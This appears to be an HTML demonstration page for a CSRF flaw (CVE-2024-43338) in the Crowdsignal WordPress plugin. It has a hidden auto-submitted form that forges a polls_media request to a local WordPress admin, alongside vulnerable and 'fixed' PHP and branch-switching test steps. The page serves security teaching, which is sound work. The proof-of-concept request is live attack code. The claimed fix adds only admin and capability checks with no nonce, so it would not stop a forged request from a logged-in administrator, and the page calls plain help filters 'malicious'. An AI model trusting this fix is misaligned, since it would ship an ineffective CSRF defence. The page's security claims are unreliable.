<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Demonstration - CVE-2024-43338</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .warning { background: #ff6b6b; color: white; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .safe { background: #51cf66; color: white; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .info { background: #339af0; color: white; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .code { background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; border-left: 4px solid #339af0; margin: 10px 0; }
        .attack-button { background: #ff6b6b; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 5px; }
        .test-button { background: #339af0; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 5px; }
        .attack-button:hover { background: #e55555; }
        .test-button:hover { background: #2c7fe0; }
        h1, h2, h3 { color: #333; }
        .version-info { background: #ffd43b; padding: 10px; border-radius: 5px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîí CSRF Attack Demonstration (CVE-2024-43338)</h1>

        <div class="warning">
            <strong>‚ö†Ô∏è WARNING:</strong> This is a security demonstration. Only use this on your own development environment!
        </div>

        <div class="version-info">
            <strong>üìã Testing Instructions:</strong>
            <ol>
                <li>Make sure you're logged into <a href="http://localhost:8888/wp-admin/" target="_blank">WordPress Admin</a> (admin/password)</li>
                <li>Test the vulnerable version by switching to master branch</li>
                <li>Test the fixed version by switching to fix branch</li>
                <li>Compare the results to see the security improvement</li>
            </ol>
        </div>

        <h2>üéØ What is CSRF?</h2>
        <p>Cross-Site Request Forgery (CSRF) tricks authenticated users into performing unwanted actions. The vulnerability in the Crowdsignal plugin allowed attackers to manipulate poll settings by tricking administrators into visiting a malicious page.</p>

        <h2>üîç The Vulnerability</h2>
        <p>The <code>polldaddy_popups_init()</code> function in <code>popups.php</code> processed the <code>polls_media</code> parameter without proper security checks:</p>

        <div class="code">
// VULNERABLE CODE (master branch):
function polldaddy_popups_init() {
    if( isset( $_REQUEST['polls_media'] ) ){
        // NO SECURITY CHECK HERE!
        add_filter( 'type_url_form_video', 'pd_video_shortcodes_help');
        add_filter( 'type_url_form_audio', 'pd_audio_shortcodes_help');
        add_filter( 'type_url_form_image', 'pd_image_shortcodes_help');
    }
}
        </div>

        <h2>üö® CSRF Attack Test</h2>

        <div class="info">
            <strong>üí° How it works:</strong> This attack sends a request with the <code>polls_media</code> parameter. The vulnerability allows external sites to manipulate plugin behavior by tricking authenticated users.
        </div>

        <div class="version-info">
            <strong>üî¨ Testing Results:</strong>
            <ul>
                <li><strong>Vulnerable (master):</strong> ‚ö†Ô∏è Attack succeeds - 3 malicious filters added</li>
                <li><strong>Fixed (fix branch):</strong> ‚úÖ Attack blocked - No filters added</li>
                <li><strong>HTTP Status:</strong> Both return 200 OK (this is normal - WordPress responds to the URL)</li>
                <li><strong>Real Impact:</strong> Vulnerability is in what the code DOES with the parameters</li>
            </ul>
        </div>

        <!-- Hidden iframe to catch the response -->
        <iframe name="csrf-iframe" style="display:none;"></iframe>

        <!-- CSRF Attack Form -->
        <form id="csrf-attack-form" method="GET" action="http://localhost:8888/wp-admin/media-upload.php" target="csrf-iframe">
            <input type="hidden" name="polls_media" value="1">
            <input type="hidden" name="type" value="image">
            <input type="hidden" name="csrf_test" value="malicious_payload">
            <input type="hidden" name="attacker_data" value="this_proves_csrf_works">
        </form>

        <button class="attack-button" onclick="performCSRFAttack()">
            üö® PERFORM CSRF ATTACK
        </button>

        <button class="test-button" onclick="testLegitimateAccess()">
            ‚úÖ TEST LEGITIMATE ACCESS
        </button>

        <button class="test-button" onclick="runBehaviorTest()">
            üî¨ RUN BEHAVIOR TEST
        </button>

        <div id="attack-result"></div>

        <h2>üõ°Ô∏è The Security Fix</h2>
        <p>Our fix prevents the attack by adding proper access control:</p>

        <div class="code">
// FIXED CODE (fix branch):
function polldaddy_popups_init() {
    if( isset( $_REQUEST['polls_media'] ) ){
        // Security check: Only add filters if we're in a valid admin context
        if ( ! is_admin() || ! current_user_can( 'edit_posts' ) ) {
            return; // BLOCKED!
        }
        add_filter( 'type_url_form_video', 'pd_video_shortcodes_help');
        add_filter( 'type_url_form_audio', 'pd_audio_shortcodes_help');
        add_filter( 'type_url_form_image', 'pd_image_shortcodes_help');
    }
}
        </div>

        <h2>üìä Testing Results</h2>
        <div id="results-section">
            <p>Click the buttons above to see how the vulnerability behaves:</p>
            <ul>
                <li><strong>Vulnerable Version (master):</strong> Attack succeeds</li>
                <li><strong>Fixed Version (fix branch):</strong> Attack is blocked</li>
                <li><strong>Legitimate Admin Use:</strong> Works correctly in both versions</li>
            </ul>
        </div>

        <h2>üîß Manual Testing Steps</h2>
        <div class="code">
# Switch to vulnerable version
git checkout master

# Test attack (should succeed)
# Visit this page and click "PERFORM CSRF ATTACK"

# Switch to fixed version
git checkout fix/csrf-vulnerability-cve-2024-43338

# Test attack again (should be blocked)
# Visit this page and click "PERFORM CSRF ATTACK"
        </div>

        <div class="safe">
            <strong>‚úÖ SECURITY VERIFICATION:</strong>
            <ul>
                <li>CSRF attacks are prevented in the fixed version</li>
                <li>Legitimate admin functionality is preserved</li>
                <li>Proper WordPress security practices are followed</li>
            </ul>
        </div>
    </div>

    <script>
        function performCSRFAttack() {
            const resultDiv = document.getElementById('attack-result');

            resultDiv.innerHTML = '<div style="background: #ffd43b; padding: 15px; border-radius: 5px; margin: 10px 0;"><strong>üîç ATTACK LAUNCHED:</strong> Check your browser Developer Tools (F12) ‚Üí Network tab to see the request being made to your WordPress site.</div>';

            // Submit the CSRF attack form
            document.getElementById('csrf-attack-form').submit();

            // Set a timeout to show results
            setTimeout(function() {
                resultDiv.innerHTML += '<div style="background: #339af0; padding: 15px; border-radius: 5px; margin: 10px 0;"><strong>üìä ANALYSIS:</strong><ul><li>‚úÖ You should see a 200 OK response (this is normal)</li><li>üîç The real test is what the code DOES with the parameters</li><li>‚ö†Ô∏è <strong>Vulnerable version:</strong> Adds 3 malicious filters</li><li>üõ°Ô∏è <strong>Fixed version:</strong> Blocks the attack, adds no filters</li></ul></div>';

                resultDiv.innerHTML += '<div style="background: #495057; color: white; padding: 15px; border-radius: 5px; margin: 10px 0;"><strong>üí° TESTING METHODOLOGY:</strong><br>‚Ä¢ <strong>HTTP Status 200:</strong> Normal (WordPress responds to URL)<br>‚Ä¢ <strong>Real Vulnerability:</strong> What happens with the polls_media parameter<br>‚Ä¢ <strong>Better Test:</strong> Use the "üî¨ RUN BEHAVIOR TEST" button below<br><br><strong>Switch branches to compare:</strong><br><code>git checkout master</code> (vulnerable)<br><code>git checkout fix/csrf-vulnerability-cve-2024-43338</code> (secure)</div>';
            }, 2000);
        }

        function testLegitimateAccess() {
            const message = `üîß TESTING LEGITIMATE ACCESS:

1. Go to: http://localhost:8888/wp-admin/
2. Login with: admin / password
3. Navigate to: Feedback ‚Üí Crowdsignal
4. Create a new poll
5. Try adding images/videos to poll answers
6. Verify media upload works correctly

This confirms our fix preserves legitimate functionality while blocking attacks!`;

            alert(message);
        }

        function runBehaviorTest() {
            const resultDiv = document.getElementById('attack-result');

            resultDiv.innerHTML = '<div style="background: #339af0; color: white; padding: 15px; border-radius: 5px; margin: 10px 0;"><strong>üî¨ RUNNING BEHAVIOR TEST:</strong><br>This test shows what actually happens when the polls_media parameter is processed...</div>';

            // Inform user about the command line test
            setTimeout(function() {
                resultDiv.innerHTML += `<div style="background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #28a745;">
                    <strong>üñ•Ô∏è COMMAND LINE TEST:</strong><br>
                    Run this command in your terminal to see the real impact:<br>
                    <code style="background: #e9ecef; padding: 5px; border-radius: 3px;">php tests/csrf-behavior-test.php</code><br><br>

                    <strong>Expected Results:</strong><br>
                    ‚Ä¢ <strong>Master branch (vulnerable):</strong> ‚ö†Ô∏è "ATTACK SUCCEEDED - 3 filters added"<br>
                    ‚Ä¢ <strong>Fix branch (secure):</strong> ‚úÖ "ATTACK BLOCKED - No filters were added"<br><br>

                    <em>This test reveals the true impact beyond just HTTP status codes!</em>
                </div>`;

                resultDiv.innerHTML += `<div style="background: #495057; color: white; padding: 15px; border-radius: 5px; margin: 10px 0;">
                    <strong>üîç WHY THIS MATTERS:</strong><br>
                    ‚Ä¢ HTTP status codes don't tell the full story<br>
                    ‚Ä¢ The vulnerability is in the APPLICATION LOGIC<br>
                    ‚Ä¢ Our fix prevents malicious filter injection<br>
                    ‚Ä¢ This is why security testing needs to look deeper than HTTP responses
                </div>`;
            }, 1000);
        }

        // Add some visual feedback when the page loads
        window.addEventListener('load', function() {
            console.log('üîí CSRF Attack Demo Loaded');
            console.log('üìç Make sure you are logged into WordPress: http://localhost:8888/wp-admin/');
            console.log('‚ö†Ô∏è  This demo is for educational purposes only - use in development environment only!');
        });
    </script>
</body>
</html>